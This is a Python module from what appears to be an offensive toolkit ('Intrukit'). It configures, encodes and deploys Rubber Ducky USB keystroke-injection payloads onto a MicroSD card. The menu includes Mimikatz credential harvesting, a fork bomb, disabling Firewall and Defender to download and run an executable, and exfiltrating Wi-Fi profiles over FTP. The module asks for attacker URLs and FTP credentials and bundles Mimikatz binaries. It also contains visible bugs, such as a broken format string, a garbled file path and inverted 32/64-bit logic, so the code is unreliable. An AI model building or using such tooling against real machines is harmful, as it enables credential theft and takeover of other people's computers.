"""
Rubby Ducky

This module will allow you to encode and deploy Rubby Ducky payloads
"""

import platform
import subprocess
from time import sleep
from lib import Colors

colors = Colors.Colors()

class Module:
    """
    Module Class
    """

    __title__ = 'payload/rubber_ducky'
    __date__ = '2019-09-02'
    __rank__ = 'normal'
    __description__ = 'This module will allow you to encode and deploy Rubber Ducky payloads'
    __details__ = """       
    Payloads
    --------------
        
        [helloworld]  Simple Hello World
        Opens notepad and types Hello World
        -------------------------------------------------
        [mimikatz]  Mimikatz Cred Harvester
        Find passwords with mimkatz
        -------------------------------------------------
        [mimikatz_twinduck]  Mimikatz Cred Harvester
        Find passwords with mimkatz
        -------------------------------------------------
        [fork]  Fork Bomb (Win7) 
        Makes and then executes a fork bomb
        -------------------------------------------------
        [admin]  Admin Command Prompt
        Opens an cmd in admin without the admin password
        -------------------------------------------------
        [download]  Download a file
        Download and then execute a given .exe
        -------------------------------------------------
        [exec_fetched_payload]  Download a file v2
        Disable Firewall & Defender, download and then execute a given .exe. (v2)
        -------------------------------------------------
        [extract_wifi_profiles_exec_fetched_payload]  Exfiltrate Wi-Fi Profiles via FTP
        This is number 6 + Export and exfiltrate Wif-Fi Profiles via FTP
        -------------------------------------------------
        [exfil]  Exfiltrate Wi-Fi Profiles via Storage (Twin Duck)
        This is number 6 + Export and exfiltrate Wif-Fi Profiles via Twin Duck Storage
        -------------------------------------------------
        [android_browser_download]  Initiate a download on an Android device via browser
        Download a file from a specific web address via browser
        -------------------------------------------------
        [back] Exit
        Cancel and return
        -------------------------------------------------
        
    Ducky Commands
    ----------------
       ALT [key name] (ex: ALT F4, ALT SPACE)
       CTRL | CONTROL [key name] (ex: CTRL ESC)
       CTRL-ALT [key name] (ex: CTRL-ALT DEL)
       CTRL-SHIFT [key name] (ex: CTRL-SHIFT ESC)
       DEFAULT_DELAY | DEFAULTDELAY [Time in millisecond * 10] (change the delay between each command)
       DELAY [Time in millisecond * 10] (used to overide temporary the default delay)
       GUI | WINDOWS [key name] (ex: GUI r, GUI l)
       REM [anything] (used to comment your code, no obligation :) )
       ALT-SHIFT (swap language)
       SHIFT [key name] (ex: SHIFT DEL)
       STRING [any character of your layout]
       REPEAT [Number] (Repeat last instruction N times)
       [key name] (anything in the keyboard.properties)
    """

    __author__ = 'Intrukit'

    def __init__(self, PAYLOAD='helloworld'):
        """
        __init__(self, PAYLOAD='helloworld')

        :param PAYLOAD:

        Initialize the module with the module's desired options
        """
        self.__dict__['PAYLOAD'] = {"value": PAYLOAD, "required": True, "description": "The name of the payload file"}

    def run(self):
        """
        run(self)

        :return:

        Run the module
        """
        if self.PAYLOAD['value']:
            if self.PAYLOAD['value'] == "mimikatz":
                url = self.print_msg('question', "URL: ")
                formatter = [url]
                self.generate_payload('mimikatz', formatter)
            elif self.PAYLOAD['value'] == "mimikatz_twinduck":
                bit = self.print_msg('question', "(32|64) bit: ")
                formatter = None

                if bit == "32":
                    formatter = ["mimikatz.exe"]
                else:
                    formatter = ["mimikatz_x64.exe"]

                self.generate_payload('mimikatz_twinduck', formatter)
            elif self.PAYLOAD['value'] == "download":
                url = self.print_msg('question', "URL: ")
                exe = self.print_msg('question', "EXE NAME: ")
                formatter = [url, exe]
                self.generate_payload('download', formatter)
            elif self.PAYLOAD['value'] ==  "exec_fetched_payload":
                url = self.print_msg('question', "URL: ")
                exe = self.print_msg('question', "EXE NAME: ")
                formatter = [url, exe]
                self.generate_payload('exec_fetched_payload', formatter)
            elif self.PAYLOAD['value'] == "extract_wifi_profiles_exec_fetched_payload":
                ftphost = self.print_msg('question', "FTP HOST: ")
                username = self.print_msg('question', "FTP USERNAME: ")
                password = self.print_msg('question', "FTP PASSWORD: ")
                url = self.print_msg('question', "URL: ")
                exe = self.print_msg('question', "EXE NAME: ")
                formatter = [ftphost, username, password, url, exe]
                self.generate_payload('extract_wifi_profiles_exec_fetched_payload', formatter)
            elif self.PAYLOAD['value'] ==  "exfil":
                url = self.print_msg('question', "URL: ")
                exe = self.print_msg('question', "EXE NAME: ")
                formatter = [url, exe]
                self.generate_payload('exfil', formatter)
            elif self.PAYLOAD['value'] == "android_browser_download":
                url = self.print_msg('question', "URL: ")
                formatter = [url]
                self.generate_payload('android_browser_download', formatter)
            elif self.PAYLOAD['value'] == "back":
                pass
            else:
                self.generate_payload(self.PAYLOAD['value'], None)
        else:
            print("You are missing required module options. Please see: show options")

    def print_msg(self, mtype, msg):
        """
        print_msg (mtype, msg)

        :param mtype:
        :param msg:
        :return:

        Print a specific type of msg or ask for input

        """
        if mtype == 'fail':
            print("[{0}-{1]] {2}".format(colors.FAIL, colors.ENDC, msg))
        elif mtype == 'success':
            print("[{0}+{1}] {2}".format(colors.OKGREEN, colors.ENDC, msg))
        elif mtype == 'alert':
            print("[{0}!{1}] {2}".format(colors.WARNING, colors.ENDC, msg))
        elif mtype == 'info':
            print("[{0}*{1}] {2}".format(colors.PURPLE, colors.ENDC, msg))
        elif mtype == 'question':
            res = input("[{0}?{1}] {2}".format(colors.CYAN, colors.ENDC, msg))
            return res

    def encode(self):
        """
        encodeO

        :return:

        Encode a specified payload .txt to .bin

        """
        encode = "resources/rubber_ducky/payloads/" + self.PAYLOAD['value'] + ".txt"
        output = "resources/rubber_ducky/injections/" + self.PAYLOAD['value'] + ".bin"


        try:
            if platform.system() == "Windows":
                subprocess.run("resources/bin/duckencoder.jar -i " + self.PAYLOAD['value'] + " -o " + output,
                               shell=True, check=True)
                self.print_msg('success', "Successfully encoded!")
            elif platform.system() == "Linux":
                subprocess.run("java -jar resources/bin/duckencoder.jar -i " + self.PAYLOAD['value'] + " -o " + output,
                               shell=True, check=True)
                self.print_msg('success', "Successfully encoded!")
        except FileNotFoundError as err:
            self.print_msg('fail', "ENCODE ERROR: {0}".format(err))
        except subprocess.CalledProcessError as err:
            self.print_msg('fail', "ENCODE ERROR: {0}".format(err))
        sleep(2)

    def configure_payload(self, payload, formatter):
        """
        configure_payload(payload, formatter)

        :param payload:
        :param formatter:
        :return:

        Configure payload with the formatter

        """
        TMP_FILE = None

        try:
            if payload == "exfil":
                FILE = open("resources/rubber_ducky/payloads/exfil/{0}.txt".format(payload), "r")
                TMP_FILE = FILE.read()
                FILE.close()
            else:
                FILE = open("resources/rubber_ducky/payloads/{0}.txt".format(payload), "r")
                TMP_FILE = FILE.read()
                FILE.close()

            FILE = open("resources/rubber_ducky/tmp/{0}.txt".format(payload), "a+")

            if formatter:
                FILE.write(TMP_FILE.format(*formatter))
                FILE.close()
            else:
                FILE.write(TMP_FILE)
                FILE.close()
            self.print_msg('success', "Payload configuration success!")
            return True
        except FileNotFoundError as err:
            self.print_msg('fail', "CONFIG ERROR: {0}".format(err))
            self.print_msg('fail', "Payload configuration failed!")
            return False
        except subprocess.CalledProcessError as err:
            self.print_msg('fail', "CONFIG ERROR: {0}".format(err))
            self.print_msg('fail', "Payload configuration failed!")
            return False

    def generate_payload(self, payload, formatter):
        """
        generate_payload(payload, formatter)

        :param payload:
        :param formatter:
        :return:

        Open the specified payload into a tmp variable, format it, encode, then deploy if required

        """
        success = False

        configuration_status = self.configure_payload(payload, formatter)

        # If payload .txt was configured properly, and payload is exfil (Twin Duck)
        if configuration_status and payload == "exfil":
            try:
                if platform.system() == "Windows":
                    subprocess.run("resources/bin/duckencoder.jar -i resources/rubber_ducky/tmp/{0}.txt -o resources/rubber_ducky/injections/{0}.bin".format(payload),
                                   shell=True, check=True)
                    self.print_msg('success', "Successfully encoded!")
                elif platform.system() == "Linux":
                    subprocess.run("java -jar resources/bin/duckencoder.jar -i resources/rubber_ducky/tmp/{0}.txt -o resources/rubber_ducky/injections/{0}.bin".format(
                        payload), shell=True, check=True)
                    self.print_msg('success', "Successfully encoded!")

                # Success is True if the above ran successfully
                success = True
            except FileNotFoundError as err:
                self.print_msg('fail', "ERROR: {0}".format(err))
                success = False
            except subprocess.CalledProcessError as err:
                self.print_msg('fail', "ERROR: {0}".format(err))
                success = False
        # If payload .txt was configured properly, and payload is NOT exfil
        elif configuration_status:
            try:
                if platform.system() == "Windows":
                    subprocess.run("resources/bin/duckencoder.jar -i resources/rubber_ducky/tmp/{0}.txt -o resources/rubber_ducky/injections/{0}.bin".format(payload),
                                   shell=True, check=True)
                    self.print_msg('success', "Successfully encoded!")
                elif platform.system() == "Linux":
                    subprocess.run("java -jar resources/bin/duckencoder.jar -i resources/rubber_ducky/tmp/{0}.txt -o resources/rubber_ducky/injections/{0}.bin".format(payload),
                                   shell=True, check=True)
                    self.print_msg('success', "Successfully encoded!")

                success = True
            except FileNotFoundError as err:
                self.print_msg('fail', "GENERATION ERROR: {0}".format(err))
                success = False
            except subprocess.CalledProcessError as err:
                self.print_msg('fail', "GENERATION ERROR: {0}".format(err))
                success = False
        # If payload .txt was NOT configured properly
        elif not configuration_status:
            # Success is False if the configuration failed
            success = False
        else:
            # Success is False if the configuration failed
            success = False

        # If payload configuration was a success, should we deploy?
        if success:
            self.print_msg('success', "Generated payload!")

            self.clean_up(payload)

            deploy = self.print_msg('question', "Deploy the payload to the Rubber Ducky (y/n)? ")

            if deploy == "n":
                return True
            elif deploy == "y":
                self.deploy_payload(payload, formatter)
                return True
            else:
                return False
        else:
            print("[-] Payload generation failed!")

    def locate_usb(self):
        """
        locate_usb()

        :return:

        Locate USB devices on a Windows machine

        """
        import win32file
        drive_list = []
        drivebits = win32file.GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = win32file.GetDriveType(drname)
                if t == win32file.DRIVE_REMOVABLE:
                    drive_list.append(drname)
        return drive_list

    def deploy_payload(self, payload, formatter=None):
        """
        deploy_payload(payload)

        :param payload:
        :param formatter:
        :return:

        Deploy the compiled payload

        """
        try:
            if payload == "exfil":
                if platform.system() == "Windows":
                    usb_drive = self.print_msg('question', "Please provide your MicroSD's drive letter? ({0})".format(
                        self.locate_usb().replace(
                            ":", "").replace("\\", "")))
                    subprocess.run("move resources\\rubber_ducky\\injections\\{0}.bin {1}:\\inject.bin".format(
                        payload,
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("copy resources\\rubber_ducky\\payloads\\exfil\\e.cmd {0}:\\e.cmd".format(
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("copy resources\\rubber_ducky\\payloads\\exfil\\d.cmd {0}:\\d.cmd".format(
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("copy resources\\rubber_ducky\\payloads\\exfil\\i.vbs {0}:\\i.vbs".format(
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("mkdir {0}:\\slurp".format(usb_drive), shell=True, check=True)
                    self.print_msg('success', "Deployment of payload succeeded")
                elif platform.system() == "Linux":
                    usb_drive = self.print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
                    subprocess.run("mv resources/rubber_ducky/injections/{0}.bin {1}/inject.bin".format(
                        payload,
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("cp presources/rubber_ducky/ayloads/exfil/e.cmd {0}/e.cmd".format(
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("cp resources/rubber_ducky/payloads/exfil/d.cmd {0}/d.cmd".format(
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("cp resources/rubber_ducky/payloads/exfil/i.vbs {0}/i.vbs".format(
                        usb_drive),
                        shell=True,
                        check=True)
                    subprocess.run("mkdir {0}/slurp".format(usb_drive), shell=True, check=True)
                    self.print_msg('success', "Deployment of payload succeeded")
            elif payload == "mimikatz_twinduck":
                if platform.system() == "Windows":
                    usb_drive = self.print_msg('question', "Please provide your MicroSD's drive letter? ({0})".format(
                        self.locate_usb().replace(
                            ":", "").replace("\\", "")))
                    subprocess.run("move resources\\rubber_ducky\\injections\\{0}.bin {1}:\\inject.bin".format(
                        payload,
                        usb_drive),
                        shell=True,
                        check=True)

                    if formatter[0] == "64":
                        subprocess.run(
                            "copy resources\\rubber_ducky\\payloads\\mimikatz\\mimikatz.exe {0}:\\mimikatz.exe".format(
                            usb_drive),
                            shell=True,
                            check=True)
                    else:
                        subprocess.run(
                            "copy resources\\rubber_ducky\\payloads\\mimikatz\\mimikatz_x64.exe {0}:\\mimikatz.exe".format(
                                usb_drive),
                            shell=True, check=True)

                    self.print_msg('success', "Deployment of payload succeeded")
                elif platform.system() == "Linux":
                    usb_drive = self.print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
                    subprocess.run("mv resources/rubber_ducky/injections/{0}.bin {1}/inject.bin".format(
                        payload,
                        usb_drive),
                        shell=True,
                        check=True)

                    if formatter[0] == "64":
                        subprocess.run(
                            "cp resources/rubber_ducky/payloads/mimikatz/mimikatz.exe {0}/mimikatz.exe".format(
                                usb_drive),
                            shell=True, check=True)
                    else:
                        subprocess.run(
                            "cp resources/rubber_ducky/payloads/mimikatz/mimikatz_x64.exe {0}/mimikatz.exe".format(
                                usb_drive),
                            shell=True, check=True)

                    self.print_msg('success', "Deployment of payload succeeded")
            else:
                if platform.system() == "Windows":
                    usb_drive = self.print_msg('question', "Please provide your MicroSD's drive letter? ({0})".format(
                        self.locate_usb().replace(
                            ":", "").replace("\\", "")))
                    subprocess.run("move resources\\rubber_ducky\\injections\\{0}.bin {1}:\\inject.bin".format(
                        payload,
                        usb_drive),
                        shell=True,
                        check=True)
                    self.print_msg('success', "Deployment of payload succeeded")
                elif platform.system() == "Linux":
                    usb_drive = self.print_msg('question', "Please provide your MicroSD's location? (/media/user/label) ")
                    subprocess.run("mv resources/rubber_ducky/injections/{0}.bin {1}/inject.bin".format(
                        payload,
                        usb_drive),
                        shell=True,
                        check=True)
                    self.print_msg('success', "Deployment of payload succeeded")



        except FileNotFoundError as err:
            print("[-] DEPLOY ERROR: {0}".format(err))
        except subprocess.CalledProcessError as err:
            print("[-] DEPLOY ERROR: {0}".format(err))

    def clean_up(self, payload):
        """
        clean_up(payload)

        :param payload:
        :return:

        Clean up temporary file

        """
        try:
            if platform.system() == "Windows":
                subprocess.run("del resources\\rubber_ducky\\tmp\\{0}.txt".format(payload), shell=True, check=True)
            elif platform.system() == "Linux":
                subprocess.run("rm resources/rubber_ducky/tmp/{0}.txt".format(payload), shell=True, check=True)
            self.print_msg('success', "Clean up complete")
        except FileNotFoundError as err:
            self.print_msg('fail', "CLEAN UP ERROR: {0}".format(err))
        except subprocess.CalledProcessError as err:
            self.print_msg('fail', "CLEAN UP ERROR: {0}".format(err))
